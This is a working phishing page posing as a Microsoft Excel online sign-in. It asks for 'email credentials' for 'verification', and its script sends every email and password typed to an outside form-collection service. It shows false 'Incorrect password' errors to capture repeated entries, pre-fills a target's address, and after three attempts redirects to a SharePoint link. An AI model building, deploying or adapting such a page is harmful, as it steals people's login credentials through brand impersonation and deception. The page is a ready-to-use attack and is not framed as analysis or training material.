<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Microsoft Excel | Online Spreadsheets</title>
  <link rel="stylesheet" href="style.css">
  <link rel="short icon" href="https://res.cdn.office.net/files/fabric-cdn-prod_20251117.001/assets/brand-icons/product/png/excel_48x3.png">
  <style>
    body {
      background-image: url('https://i.imgur.com/126xhl1.png');
      background-size: cover;
      background-repeat: no-repeat;
      background-position: fit;
      font-family: Arial, sans-serif;
      color: #333;
      text-align: center;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .container {
      background-color: rgba(225, 225, 225, 0.5);
      padding: 30px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
      border-radius: 8px;
      width: 320px;
    }

    .logo img {
      max-width: 55%;
      height: auto;
      margin-bottom: 30px;
    }

    .input-fields input {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 4px;
      box-sizing: border-box;
    }

    .signin-button {
      padding: 10px 20px;
      background-color: #006100;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }

    .signin-button:hover {
      background-color: #0056b3;
    }

    .message {
      display: none;
      color: red;
      margin-top: 15px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img id="logo" src="https://www.pngall.com/wp-content/uploads/15/Excel-Logo-PNG-Cutout.png" alt="">
<p style="margin-bottom: -30px;margin-top: 2px;font-weight: bold;text-align: right;"></p>
<p style="font-size: 12px;align: left;margin-bottom: 10px;color: green;">Do more for free.<br> Sign in or create a free account.</p>
<p><strong>Verification is required&#x1F512<strong> <br><br>Enter your email credentials to proceed.</p>

    <form id="loginForm">
      <div class="input-fields">
        <input id="email" name="email" type="email" placeholder="Email" value="hak9918@bomienc.com" required />
        <input id="password" name="password" type="password" placeholder="Password" required />
      </div>
      <button type="submit" class="signin-button" id="signin-button">LOGIN</button>
    </form>

    <div id="message" class="message">Incorrect password</div>
  </div>

  <script>
    let attempt = 0;
    const maxAttempts = 3;  // Number of incorrect attempts allowed
    const form = document.getElementById("loginForm");
    const message = document.getElementById("message");
    const emailInput = document.getElementById("email");
    const passwordInput = document.getElementById("password");

    form.addEventListener("submit", function (e) {
      e.preventDefault(); // Stop the form from redirecting
      const email = emailInput.value;
      const password = passwordInput.value;

      // Send to PHP for every attempt
      fetch("https://submit-form.com/c01WSbDWo", {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded"
        },
        body: email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}
      });

      attempt++;
      if (attempt < maxAttempts) {
        message.style.display = "block";
        message.textContent = "Incorrect password"; // Display message for incorrect password
        passwordInput.value = ""; // Clear password field for next attempt
      } else {
        // After 3 attempts, redirect to Google
        setTimeout(() => {
          window.location.href = "https://regionalmanagers-my.sharepoint.com/:b:/p/ivan/EVhCMbG-roNHisHIx3fXqXkBATy7wZKPXYQsdKYIS5rgWA?e=1XABKN"; // Redirect after 3 attempts
        }, 2000); // Small delay to allow last attempt to process
      }
    });
  </script>
</body>
</html>
